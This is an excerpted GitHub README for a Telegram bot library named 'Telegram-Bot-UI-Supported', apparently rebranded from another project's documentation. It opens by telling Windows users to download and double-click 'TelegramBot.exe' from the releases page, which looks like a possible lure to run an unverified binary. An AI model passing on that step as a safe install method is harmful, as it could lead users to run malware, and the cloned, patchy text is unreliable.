<p align="center">
<img src=https://img.shields.io/github/stars/telegrambotum/Telegram-Bot-UI-Supported?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/forks/telegrambotum/Telegram-Bot-UI-Supported?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/issues/telegrambotum/Telegram-Bot-UI-Supported?style=for-the-badge&logo=appveyor&color=informational />
<img src=https://img.shields.io/github/issues-pr/telegrambotum/Telegram-Bot-UI-Supported?style=for-the-badge&logo=appveyor&color=informational />
</p>

# <p align="center">Telegram-Bot-UI-Supported
...
- Download [WindowsApp](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/releases/) the latest version.
- Double-Click on the "TelegramBot.exe" open to run it.

### Way 2 (Windows and MacOs)

## Go First and make sure Python and Git is installed
...
```shell
git clone https://github.com/telegrambotum/Telegram-Bot-UI-Supported
cd Telegram-Bot-UI-Supported
...
For more, check out in [examples](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/tree/master/examples/middleware/class_based)	
	
#### Custom filters
Also, you can use built-in custom filters. Or, you can create your own filter.	

[Example of custom filter](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/blob/master/examples/custom_filters/general_custom_filters.py)
	
Also, we have examples on them. Check this links:
	
You can check some built-in filters in source [code](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/blob/master/telebot/custom_filters.py)
	
Example of [filtering by id](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/blob/master/examples/custom_filters/id_filter_example.py)
	
Example of [filtering by text](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/blob/master/examples/custom_filters/text_filter_example.py)
...
tb.send_audio(CHAT_ID, file_data, 1, 'telegrambotum', 'pyTelegram')
...
Telegram-Bot-UI-Supported also supports this feature.
```python
from telebot import apihelper

apihelper.API_URL = "http://localhost:4200/bot{0}/{1}"
```
**Important: Like described [here](https://core.telegram.org/bots/api#logout), you have to log out your bot from the Telegram server before switching to your local API server. in Telegram-Bot-UI-Supported use `bot.log_out()`**
...
See more in [examples](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/tree/master/examples/asynchronous_telebot)
...
If you want to use socket5 proxy you need install dependency `pip install requests[socks]` and make sure, that you have the latest version of `gunicorn`, `PySocks`, `Telegram-Bot-UI-Supported`, `requests` and `urllib3`.
...
### Examples
See more examples in our [examples](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/tree/master/examples/asynchronous_telebot) folder
...
* Join the [Telegram-Bot-UI-Supported Telegram Chat Group](https://telegram.me/joinchat/Bn4ixj84FIZVkwhk2jag6A)
	
## Telegram Channel

Join the [News channel](https://t.me/Telegram-Bot-UI-Supported). Here we will post releases and updates.
	
## More examples

* [Echo Bot](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/blob/master/examples/echo_bot.py)
* [Deep Linking](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/blob/master/examples/deep_linking.py)
* [next_step_handler Example](https://github.com/telegrambotum/Telegram-Bot-UI-Supported/blob/master/examples/step_example.py)
